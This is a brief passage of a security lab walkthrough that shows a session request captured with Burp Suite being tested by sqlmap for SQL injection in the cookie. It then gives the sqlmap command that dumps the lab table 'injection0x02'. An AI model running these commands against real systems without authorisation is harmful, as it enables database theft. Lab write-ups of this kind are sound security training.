We will still be needing `burpsuite` and `sqlmap` for this lab

We can go ahead and save the request with the **cookie: session**

Using this query `$ sqlmap -r request.txt --level=2` we can see that the `sqlmap` tells us that the cookie parameter is vulnerable with more information given

We can then attempt to dump the table of **"Injection 0x02"** by using this command as shown below

```bash
# -r : request file
# --level=2 : Level of tests to perform
# --dump : Dump DBMS database table entries
# -T : DBMS database table(s) to enumerate

$ sqlmap -r request.txt --level=2 --dump -T injection0x02
```
